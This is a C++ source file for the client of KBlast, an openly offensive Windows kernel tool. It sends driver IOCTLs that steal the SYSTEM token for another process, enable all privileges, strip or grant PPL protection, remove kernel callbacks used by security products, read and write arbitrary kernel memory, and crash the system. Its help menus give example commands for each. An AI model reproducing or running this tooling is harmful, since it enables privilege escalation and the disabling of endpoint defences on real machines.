/*
* Author:	Angelo Frasca Caccia ( lem0nSec_ )
* Title:	KBlast.exe ( client )
* Website:	https://github.com/lem0nSec/KBlast
*/


#include "KBlast_c_device_dispatch.hpp"


KBLAST_HELP_MENU Generic_Cmds[8] = {
	{L"help", L"Show this help"},
	{L"quit", L"Quit KBlast"},
	{L"cls", L"Clear the screen"},
	{L"banner", L"Print KBlast banner"},
	{L"pid", L"Show current pid"},
	{L"time", L"Display system time"},
	{L"version", L"Display system version information"},
	{L"!{cmd}", L"Execute system command"}
};

KBLAST_HELP_MENU Misc_Cmds[2] = {
	{L"bsod", L"Guess what this command does"},
	{L"blob", L"blobs management"},
};

KBLAST_HELP_MENU Prot_Cmds[4] = {
	{L"wintcb", L"Enable PPL full(wintcb)"},
	{L"lsa", L"Enable PPL light(lsa)"},
	{L"antimalware", L"Enable PPL light(antimalware)"},
	{L"none", L"Disable PPL"}
};

KBLAST_HELP_MENU Tokn_Cmds[4] = {
	{L"enablepriv", L"Enable all privileges for a given process"},
	{L"disablepriv", L"Disable all privileges for a given process"},
	{L"steal", L"Steal token and give it to a given process"},
	{L"restore", L"Restore the original token of a given process"}
};

KBLAST_HELP_MENU Call_Cmds[4] = {
	{L"process", L"Process creation kernel callbacks"},
	{L"thread", L"Thread creation kernel callbacks"},
	{L"image", L"Image loading kernel callbacks"},
	{L"reg", L"Registry kernel callbacks"}
};


wchar_t Call_Examples[] =
L"$ call|process|list\n"
L"$ call|process|remove|ffffffff12121212\n";

wchar_t Tokn_Examples[] =
L"$ tokn|enablepriv|123 - ( enable all privileges for process 123 )\n"
L"$ tokn|disablepriv|123 - (disable all privileges for process 123 )\n"
L"$ tokn|steal|4|123 - ( replace 123's token with System's [ 4 ] )\n"
L"$ tokn|restore|123 - ( restore 123's token [ ! experimental ! ] )\n";

wchar_t Prot_Examples[] =
L"$ prot|wintcb|123\n"
L"$ prot|lsa|123\n"
L"$ prot|antimalware|123\n"
L"$ prot|none|123\n";

wchar_t Misc_Examples[] =
L"$ misc|blob|save|90909090 - ( save the given blob [ requires a free container ] )\n"
L"$ misc|blob|info|1 - ( dump container 1 )\n"
L"$ misc|blob|delete|1 - ( free container 1 )\n"
L"$ misc|read|ffffffff12121212|300 - ( read 300 bytes at the given kernel address )\n"
L"$ misc|blob|write|ffffffff12121212|1 - ( write 1's blob at the given kernel address )\n";

wchar_t Generic_Examples[] = L"No example is available for ' generic ' commands\n";

void KBlast_c_module_help(HELP_MENU help)
{
	DWORD i = 0, maxSize = 0;
	PKBLAST_HELP_MENU menu = 0;
	wchar_t* examples = 0;

	switch (help)
	{
	case CALLBACKS:
		wprintf(L"\nCommands - ' call ' ( kernel callbacks interactions )\n\n");
		menu = (PKBLAST_HELP_MENU)&Call_Cmds;
		maxSize = 4;
		examples = Call_Examples;
		break;

	case TOKEN:
		wprintf(L"\nCommands - ' tokn ' ( token manipulation interactions )\n\n");
		menu = (PKBLAST_HELP_MENU)&Tokn_Cmds;
		maxSize = 4;
		examples = Tokn_Examples;
		break;

	case PROTECTION:
		wprintf(L"\nCommands - ' prot ' ( process protection interactions )\n\n");
		menu = (PKBLAST_HELP_MENU)&Prot_Cmds;
		maxSize = 4;
		examples = Prot_Examples;
		break;

	case MISC:
		wprintf(L"\nCommands - ' misc ' ( misc functionalities. Kernel memory reading/writing interactions, etc... )\n\n");
		menu = (PKBLAST_HELP_MENU)&Misc_Cmds;
		maxSize = 2;
		examples = Misc_Examples;
		break;

	case GENERIC:
		wprintf(L"\nCommands - ' generic ' ( generic commands. Do not initiate kernel interactions )\n\n");
		menu = (PKBLAST_HELP_MENU)&Generic_Cmds;
		maxSize = 8;
		examples = Generic_Examples;
		break;

	default:
		break;
	}

	if (maxSize != 0)
	{
		for (i = 0; i < maxSize; i++)
		{
			wprintf(L"\t%10s:\t%s\n", menu[i].Command, menu[i].Description);
		}
		wprintf(L"\nExamples:\n\n%s\n", examples);
	}

}

BOOL KBlast_c_device_control(IN DWORD ControlCode, IN OPTIONAL LPVOID pCommandLine, IN OPTIONAL DWORD szIn, OUT OPTIONAL LPVOID outBuffer, IN OPTIONAL DWORD szOutBuffer)
{
	BOOL status = FALSE;
	HANDLE hDriver = 0;
	DWORD bsReturned = 0;

	hDriver = CreateFile(KBLAST_DRV_FILENAME, GENERIC_ALL, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
	if (hDriver != INVALID_HANDLE_VALUE)
	{
		status = DeviceIoControl(hDriver, ControlCode, pCommandLine, szIn, outBuffer, szOutBuffer, &bsReturned, 0);
		CloseHandle(hDriver);
	}

	return status;

}


BOOL KBlast_c_device_dispatch_misc(wchar_t* input)
{
	BOOL status = FALSE;
	KBLAST_COMMANDLINE_ARGUMENTS args = { 0 };
	KBLAST_BUFFER DeviceArgs = { 0 };
	PKBLAST_MEMORY_BUFFER pBuf = 0;
	PKBLAST_MEMORY_BUFFER pOutBuf = 0;
	char* realInput = 0;
	int argc = 0;
	DWORD i = 0;


	realInput = KBlast_c_utils_UnicodeStringToAnsiString(input);
	argc = KBlast_c_utils_GetCommandLineArguments(realInput, 0x7C, &args);
	if (args.arg1 != 0)
	{
		if (strcmp(args.arg1, "help") == 0)
		{
			KBlast_c_module_help(MISC);
		}
		if (strcmp(args.arg1, "bsod") == 0)
		{
			status = KBlast_c_device_control(KBLAST_IOCTL_BUG_CHECK, NULL, NULL, NULL, NULL);
		}
		if (strcmp(args.arg1, "blob") == 0)
		{
			if ((strcmp(args.arg2, "save") == 0))
			{
				status = KBlast_c_blob_manage(args.arg3, NULL, NULL, BLOB_SAVE);
			}
			if ((strcmp(args.arg2, "delete") == 0))
			{
				status = KBlast_c_blob_manage(NULL, (char*)args.arg3, NULL, BLOB_DELETE);
			}
			if ((strcmp(args.arg2, "info") == 0))
			{
				status = KBlast_c_blob_manage(NULL, (char*)args.arg3, NULL, BLOB_INFO);
			}
			if ((strcmp(args.arg2, "write") == 0)) // |||	args : arg1(blob), arg2(write), arg3(ptr), arg4(container)		blob|write|0x...|1		{submodule, operation, dest, source} -> kernel memory write
			{
				if ((args.arg3 != NULL) && (args.arg4 != NULL))
				{
					pBuf = (PKBLAST_MEMORY_BUFFER)LocalAlloc(LPTR, sizeof(KBLAST_MEMORY_BUFFER));
					if (pBuf != 0)
					{
						status = KBlast_c_blob_manage(args.arg3, (char*)args.arg4, pBuf, BLOB_WRITE);
						if (status == TRUE)
						{
							printf("[*] Writing %d bytes at 0x%-016p\n", pBuf->size, pBuf->ptr);
							status = KBlast_c_device_control(KBLAST_IOCTL_MEMORY_WRITE, (LPVOID)pBuf, sizeof(KBLAST_MEMORY_BUFFER), NULL, NULL);
						}
						LocalFree(pBuf);
					}
				}
			}
			if ((strcmp(args.arg2, "read") == 0))
			{
				if ((args.arg3 != NULL) && (args.arg4 != NULL) && (args.arg5 != NULL)) // args : arg1(blob), arg2(read), arg3(ptr), arg4(size), arg5()
				{
					pBuf = (PKBLAST_MEMORY_BUFFER)LocalAlloc(LPTR, sizeof(KBLAST_MEMORY_BUFFER));
					if (pBuf != 0)
					{
						pBuf->size = atoi(args.arg4);
						pBuf->ptr = KBlast_c_utils_StringToKernelPointer(args.arg3, (DWORD)strlen(args.arg3)); // see if this block should be moved to KBlast_c_blob_manage
						if ((pBuf->size != 0) && (pBuf->ptr != 0))
						{
							pOutBuf = (PKBLAST_MEMORY_BUFFER)LocalAlloc(LPTR, sizeof(KBLAST_MEMORY_BUFFER));
							if (pOutBuf != 0)
							{
								printf("[*] Reading %d bytes at 0x%-016p\n", pBuf->size, pBuf->ptr);
								status = KBlast_c_device_control(KBLAST_IOCTL_MEMORY_READ, (LPVOID)pBuf, sizeof(KBLAST_MEMORY_BUFFER), (LPVOID)pOutBuf, sizeof(KBLAST_MEMORY_BUFFER));
								if (status == TRUE)
								{
									pOutBuf->size = pBuf->size;
									status = KBlast_c_blob_manage(NULL, NULL, pOutBuf, BLOB_READ);
								}
								LocalFree(pOutBuf);
							}
						}
						LocalFree(pBuf);
					}
				}
			}
		}
	}

	KBlast_c_utils_FreeAnsiString(realInput);

	return status;

}


BOOL KBlast_c_device_dispatch_protection(wchar_t* input)
{
	BOOL status = FALSE;
	KBLAST_COMMANDLINE_ARGUMENTS args = { 0 };
	KBLAST_BUFFER DeviceArgs = { 0 };
	char* realInput = 0;
	int argc = 0;
	
	realInput = KBlast_c_utils_UnicodeStringToAnsiString(input);
	argc = KBlast_c_utils_GetCommandLineArguments(realInput, 0x7C, &args);
	if ((args.arg1 != NULL) && (args.arg2 != NULL))
	{
		if (strcmp(args.arg1, "help") == 0)
		{
			KBlast_c_module_help(PROTECTION);
		}
		if (strcmp((const char*)((PUCHAR)args.arg1), "wintcb") == 0)
		{
			DeviceArgs.integer1 = atoi((const char*)((PUCHAR)args.arg2));
			if (DeviceArgs.integer1 != 0)
			{
				printf("Protection : full(wintcp) : %d\n", DeviceArgs.integer1);
				status = KBlast_c_device_control(KBLAST_IOCTL_PROTECT_WINTCB, &DeviceArgs, sizeof(KBLAST_BUFFER), NULL, NULL);
				// check result
			}
		}
		if (strcmp((const char*)((PUCHAR)args.arg1), "lsa") == 0)
		{
			DeviceArgs.integer1 = atoi((const char*)((PUCHAR)args.arg2));
			if (DeviceArgs.integer1 != 0)
			{
				printf("Protection : light(lsa) : %d\n", DeviceArgs.integer1);
				status = KBlast_c_device_control(KBLAST_IOCTL_PROTECT_LSA, &DeviceArgs, sizeof(KBLAST_BUFFER), NULL, NULL);
				// check result
			}
		}
		if (strcmp((const char*)((PUCHAR)args.arg1), "antimalware") == 0)
		{
			DeviceArgs.integer1 = atoi((const char*)((PUCHAR)args.arg2));
			if (DeviceArgs.integer1 != 0)
			{
				printf("Protection : light(antimalware) : %d\n", DeviceArgs.integer1);
				status = KBlast_c_device_control(KBLAST_IOCTL_PROTECT_ANTIMALWARE, &DeviceArgs, sizeof(KBLAST_BUFFER), NULL, NULL);
				// check result
			}
		}
		if (strcmp((const char*)((PUCHAR)args.arg1), "none") == 0)
		{
			DeviceArgs.integer1 = atoi((const char*)((PUCHAR)args.arg2));
			if (DeviceArgs.integer1 != 0)
			{
				printf("Protection : none : %d\n", DeviceArgs.integer1);
				status = KBlast_c_device_control(KBLAST_IOCTL_PROTECT_NONE, &DeviceArgs, sizeof(KBLAST_BUFFER), NULL, NULL);
				// check result
			}
		}
	}
	else
	{
		KBlast_c_module_help(PROTECTION);
	}

	KBlast_c_utils_FreeAnsiString(realInput);

	return status;

}


BOOL KBlast_c_device_dispatch_token(wchar_t* input)
{
	BOOL status = FALSE;
	KBLAST_COMMANDLINE_ARGUMENTS args = { 0 };
	KBLAST_BUFFER DeviceArgs = { 0 };
	char* realInput = 0;
	int argc = 0;


	realInput = KBlast_c_utils_UnicodeStringToAnsiString(input);
	argc = KBlast_c_utils_GetCommandLineArguments(realInput, 0x7C, &args);
	if ((args.arg1 != NULL) && (args.arg2 != NULL) /* && (args.arg3 != NULL)*/) // don't really need to check argc
	{
		if (strcmp(args.arg1, "help") == 0)
		{
			KBlast_c_module_help(TOKEN);
		}
		if (strcmp((const char*)((PUCHAR)args.arg1), "enablepriv") == 0)
		{
			DeviceArgs.integer1 = atoi((const char*)((PUCHAR)args.arg2));
			if (DeviceArgs.integer1 != 0)
			{
				printf("Privileges : full : %d\n", DeviceArgs.integer1);
				status = KBlast_c_device_control(KBLAST_IOCTL_TOKEN_PRIVILEGES_ENABLEALL, &DeviceArgs, sizeof(KBLAST_BUFFER), NULL, NULL);
				// check result
			}
		}
		if (strcmp((const char*)((PUCHAR)args.arg1), "disablepriv") == 0)
		{
			DeviceArgs.integer1 = atoi((const char*)((PUCHAR)args.arg2));
			if (DeviceArgs.integer1 != 0)
			{
				printf("Privileges : none : %d\n", DeviceArgs.integer1);
				status = KBlast_c_device_control(KBLAST_IOCTL_TOKEN_PRIVILEGES_DISABLEALL, &DeviceArgs, sizeof(KBLAST_BUFFER), NULL, NULL);
				// check result
			}
		}
		if (strcmp((const char*)((PUCHAR)args.arg1), "steal") == 0)
		{
			DeviceArgs.integer2 = atoi((const char*)((PUCHAR)args.arg2));
			DeviceArgs.integer1 = atoi((const char*)((PUCHAR)args.arg3));
			if ((DeviceArgs.integer1 != 0) && (DeviceArgs.integer2 != 0))
			{
				printf("Token : steal : %d into-> %d (token)\n", DeviceArgs.integer2, DeviceArgs.integer1);
				status = KBlast_c_device_control(KBLAST_IOCTL_TOKEN_STEAL, &DeviceArgs, sizeof(KBLAST_BUFFER), NULL, NULL);
				// check result
			}
		}
		if (strcmp((const char*)((PUCHAR)args.arg1), "restore") == 0)
		{
			DeviceArgs.integer1 = atoi((const char*)((PUCHAR)args.arg2));
			if (DeviceArgs.integer1 != 0)
			{
				printf("Token : restore : %d\n", DeviceArgs.integer1);
				status = KBlast_c_device_control(KBLAST_IOCTL_TOKEN_RESTORE, &DeviceArgs, sizeof(KBLAST_BUFFER), NULL, NULL);
				// check result
				// see if more than a token can be restored (I don't think that's feasible right now)
			}
		}
	}
	else
	{
		KBlast_c_module_help(TOKEN);
	}


	KBlast_c_utils_FreeAnsiString(realInput);

	return status;

}


BOOL KBlast_c_device_dispatch_callbacks(wchar_t* input)
{
	BOOL status = FALSE;
	KBLAST_COMMANDLINE_ARGUMENTS args = { 0 };
	KBLAST_BUFFER DeviceArgs = { 0 };
	PPROCESS_KERNEL_CALLBACK_STORAGE pOutBuffer = 0;
	DWORD i = 0;
	char* realInput = 0;
	int argc = 0;


	realInput = KBlast_c_utils_UnicodeStringToAnsiString(input);
	argc = KBlast_c_utils_GetCommandLineArguments(realInput, 0x7C, &args);

	if ((args.arg1 != NULL) && (args.arg2 != NULL))
	{
		if (strcmp(args.arg1, "help") == 0)
		{
			KBlast_c_module_help(CALLBACKS);
		}
		if (strcmp((const char*)((PUCHAR)args.arg2), "list") == 0)
		{
			pOutBuffer = (PPROCESS_KERNEL_CALLBACK_STORAGE)LocalAlloc(LPTR, sizeof(PROCESS_KERNEL_CALLBACK_STORAGE));
			if (pOutBuffer != 0)
			{
				if (strcmp((const char*)((PUCHAR)args.arg1), "process") == 0)
				{
					status = KBlast_c_device_control(KBLAST_IOCTL_CALLBACK_PROCESS_LIST, NULL, NULL, (LPVOID)pOutBuffer, sizeof(PROCESS_KERNEL_CALLBACK_STORAGE));
					// check result
				}
				if (strcmp((const char*)((PUCHAR)args.arg1), "thread") == 0)
				{
					status = KBlast_c_device_control(KBLAST_IOCTL_CALLBACK_THREAD_LIST, NULL, NULL, (LPVOID)pOutBuffer, sizeof(PROCESS_KERNEL_CALLBACK_STORAGE));
					// check result
				}
				if (strcmp((const char*)((PUCHAR)args.arg1), "image") == 0)
				{
					status = KBlast_c_device_control(KBLAST_IOCTL_CALLBACK_IMAGE_LIST, NULL, NULL, (LPVOID)pOutBuffer, sizeof(PROCESS_KERNEL_CALLBACK_STORAGE));
					// check result
				}
				if (strcmp((const char*)((PUCHAR)args.arg1), "reg") == 0)
				{
					status = KBlast_c_device_control(KBLAST_IOCTL_CALLBACK_REGISTRY_LIST, NULL, NULL, (LPVOID)pOutBuffer, sizeof(PROCESS_KERNEL_CALLBACK_STORAGE));
					// check result
				}
			}
		}
		if (strcmp((const char*)((PUCHAR)args.arg2), "remove") == 0)
		{
			DeviceArgs.pointer = KBlast_c_utils_StringToKernelPointer(args.arg3, (DWORD)strlen(args.arg3));
			if ((strcmp((const char*)((PUCHAR)args.arg1), "process") == 0) && (DeviceArgs.pointer != 0))
			{
				printf("Callback : process : remove : 0x%-016p\n", DeviceArgs.pointer);
				status = KBlast_c_device_control(KBLAST_IOCTL_CALLBACK_PROCESS_REMOVE, (LPVOID)&DeviceArgs, sizeof(KBLAST_BUFFER), NULL, NULL);
			}
			if ((strcmp((const char*)((PUCHAR)args.arg1), "thread") == 0) && (DeviceArgs.pointer != 0))
			{
				printf("Callback : thread : remove : 0x%-016p\n", DeviceArgs.pointer);
				status = KBlast_c_device_control(KBLAST_IOCTL_CALLBACK_THREAD_REMOVE, (LPVOID)&DeviceArgs, sizeof(KBLAST_BUFFER), NULL, NULL);
			}
			if ((strcmp((const char*)((PUCHAR)args.arg1), "image") == 0) && (DeviceArgs.pointer != 0))
			{
				printf("Callback : image : remove : 0x%-016p\n", DeviceArgs.pointer);
				status = KBlast_c_device_control(KBLAST_IOCTL_CALLBACK_IMAGE_REMOVE, (LPVOID)&DeviceArgs, sizeof(KBLAST_BUFFER), NULL, NULL);
			}
			if ((strcmp((const char*)((PUCHAR)args.arg1), "reg") == 0) && (DeviceArgs.pointer != 0))
			{
				printf("Callback : reg : remove : 0x%-016p\n", DeviceArgs.pointer);
				status = KBlast_c_device_control(KBLAST_IOCTL_CALLBACK_REGISTRY_REMOVE, (LPVOID)&DeviceArgs, sizeof(KBLAST_BUFFER), NULL, NULL);
			}
		}
	}
	else
	{
		KBlast_c_module_help(CALLBACKS);
	}

	

	if ((status == TRUE) && ((strcmp((const char*)((PUCHAR)args.arg2), "list") == 0)))
	{
		ULONG offset = 0;
		char* name = 0;
		for (i = 0; i < pOutBuffer->CallbackQuota; i++)
		{
			offset = (ULONG)((DWORD_PTR)pOutBuffer->CallbackInformation[i].CallbackFunctionPointer - (DWORD_PTR)pOutBuffer->CallbackInformation[i].ModuleInformation.ModuleBase);
			name = KBlast_c_utils_GetImageNameByFullPath(pOutBuffer->CallbackInformation[i].ModuleInformation.ModuleFullPathName);
			if (pOutBuffer->CallbackInformation[i].CallbackHandle != 0)
			{
				//printf("[+] Handle : 0x%-016p | Pointer : 0x%-016p ( %s + %lu )\n", (PVOID)pOutBuffer->CallbackInformation[i].CallbackHandle, (PVOID)pOutBuffer->CallbackInformation[i].CallbackFunctionPointer, name, offset);
				printf(
					"\n[+] %s\n\t\t[*] Handle : 0x%-016p\n\t\t[*] Pointer : 0x%-016p ( %s + %lu )\n",
					name, (PVOID)pOutBuffer->CallbackInformation[i].CallbackHandle, (PVOID)pOutBuffer->CallbackInformation[i].CallbackFunctionPointer, name, offset
				);
			}
			else
			{
				//printf("[+] Pointer : 0x%-016p ( %s + %lu )\n", (PVOID)pOutBuffer->CallbackInformation[i].CallbackFunctionPointer, name, offset);
				printf(
					"\n[+] %s\n\t\t[*] Pointer : 0x%-016p ( %s + %lu )\n",
					name, (PVOID)pOutBuffer->CallbackInformation[i].CallbackFunctionPointer, name, offset
				);
			}
		}
		offset = 0;
		name = 0;

		RtlZeroMemory(pOutBuffer, sizeof(PROCESS_KERNEL_CALLBACK_STORAGE));
		LocalFree(pOutBuffer);

	}

	KBlast_c_utils_FreeAnsiString(realInput);

	return status;
}